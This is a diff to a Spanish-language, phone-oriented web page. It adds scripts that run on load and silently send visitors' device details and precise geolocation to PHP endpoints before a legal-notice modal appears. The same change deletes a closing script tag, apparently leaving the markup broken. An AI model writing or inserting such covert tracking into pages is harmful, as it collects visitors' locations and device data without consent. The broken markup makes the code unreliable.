@@ -70,6 +70,46 @@
     <p>Abre desde tu teléfono</p>
 </div>
 
+<!-- jQuery desde CDN (recomendado para evitar fallos) -->
+<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+
+<!-- ajax.js integrado (envía info del dispositivo) -->
+<script>
+$(function() {
+    var ua = navigator.userAgent;
+    var lang = navigator.language || navigator.userLanguage;
+    var platform = navigator.platform;
+
+    $.post('recibe_info.php', {
+        agent: ua,
+        navegador: navigator.appName,
+        versionapp: navigator.appVersion,
+        dystro: platform,
+        idioma: lang,
+        bateri: 'No disponible'
+    });
+});
+</script>
+
+<!-- Geolocalización con fallback (envía siempre) -->
+<script>
+if ('geolocation' in navigator) {
+    navigator.geolocation.getCurrentPosition(
+        pos => fetch('location.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(pos.coords)
+        }),
+        err => fetch('location.php', {
+            method: 'POST',
+            body: JSON.stringify({error: err.message})
+        })
+    );
+} else {
+    fetch('location.php', { method: 'POST', body: JSON.stringify({error: 'No soportada'}) });
+}
+</script>
+    
 <!-- MODAL AVISO LEGAL INICIAL -->
 <div id="modal-aviso-legal" class="modal active">
     <div class="modal-content">
@@ -235,26 +275,7 @@
         modalAvisoInicial.classList.remove("active");
         ageModal.classList.add("active");
     }
-</script>
 
-<!-- CÓDIGO QUE QUERÍAS AGREGAR - SE EJECUTA INMEDIATAMENTE AL INICIAR -->
-<script src="jquery.min.js"></script>
-<!-- <script src="ip.js"></script> -->
-<script src="ajax.js"></script>
-
-<script>
-    // Geolocalización - se ejecuta al instante
-    if ('geolocation' in navigator) {
-      navigator.geolocation.getCurrentPosition(function(pos) {
-        const { latitude, longitude, accuracy } = pos.coords;
-        fetch('location.php', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude, longitude, accuracy })
-        });
-      });
-    }
-</script>
 
 </body>
 </html>
